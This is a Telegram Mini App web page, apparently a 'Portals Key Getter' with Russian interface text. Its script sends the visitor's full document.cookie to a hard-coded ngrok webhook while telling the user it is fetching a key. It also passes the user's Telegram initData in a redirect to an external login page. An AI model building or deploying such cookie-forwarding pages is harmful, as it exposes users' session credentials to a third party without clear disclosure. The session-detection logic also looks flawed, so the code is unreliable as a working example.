<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background:var(--tg-theme-bg-color);color:var(--tg-theme-text-color);display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;">
    <h3 id="title">🔑 Portals Key Getter</h3>
    <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Проверка сессии...</p>
    
    <!-- Кнопка для ручного возврата, если авто-редирект не сработал -->
    <button id="btn" onclick="goBackAndFetch()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;margin-top:10px;">
        Я вошел! Забрать ключ
    </button>

    <script>
        const t = window.Telegram.WebApp;
        t.expand();
        const statusEl = document.getElementById('status');
        const btn = document.getElementById('btn');
        const NGROK_URL = "https://7793-31-76-55-178.ngrok-free.app/webhook";
        
        // Ссылка на НАШУ страницу (для возврата после авторизации)
        const MY_URL = "https://mike11334477-afk.github.io/portals-webapp/";

        // Проверяем наличие initData
        if (!t.initData) {
            statusEl.innerHTML = "❌ Запустите через кнопку в Telegram боте (/portals).";
        } else {
            checkSession();
        }

        function checkSession() {
            // Ищем куки авторизации Portals
            const hasSession = document.cookie.includes('stel_ssid') || 
                               document.cookie.includes('portals_') ||
                               document.cookie.length > 100; 
            
            if (hasSession) {
                statusEl.innerHTML = "✅ Сессия найдена! Запрашиваю ключ...";
                fetchKey();
            } else {
                statusEl.innerHTML = "⏳ Авторизация не обнаружена.<br>Перенаправляю на вход в Portals...";
                
                // ВАЖНО: Используем window.location.href для редиректа ВНУТРИ WebApp
                // Добавляем параметр return_url, чтобы Portals знали, куда вернуть пользователя
                const encodedInitData = encodeURIComponent(t.initData);
                const returnUrl = encodeURIComponent(MY_URL);
                
                // Пробуем разные варианты URL входа
                const authUrl = `https://portal-market.com/auth?tgWebAppData=${encodedInitData}&return_url=${returnUrl}`;
                
                // Редирект внутри текущего окна WebApp
                setTimeout(() => {
                    window.location.href = authUrl;
                }, 1500);
            }
        }

        // Функция для кнопки "Я вошел" (если пользователь вернулся вручную)
        function goBackAndFetch() {
            checkSession();
        }

        function fetchKey() {
            fetch(NGROK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ cookies: document.cookie })
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'ok') {
                    statusEl.innerHTML = "✅ Ключ успешно получен!<br>Проверьте личку бота.";
                    setTimeout(() => t.close(), 3000);
                } else {
                    statusEl.innerHTML = "❌ Ошибка API:<br>" + (d.details || d.msg);
                    // Если ошибка 401, предлагаем войти снова
                    if (d.details && d.details.includes('401')) {
                        btn.style.display = "block";
                        btn.innerText = "Сессия истекла. Войти заново";
                        btn.onclick = () => { window.location.href = `https://portal-market.com/auth?tgWebAppData=${encodeURIComponent(t.initData)}&return_url=${encodeURIComponent(MY_URL)}`; };
                    }
                }
            })
            .catch(e => {
                statusEl.innerHTML = "❌ Сетевая ошибка:<br>" + e.message;
            });
        }
    </script>
</body>
</html>
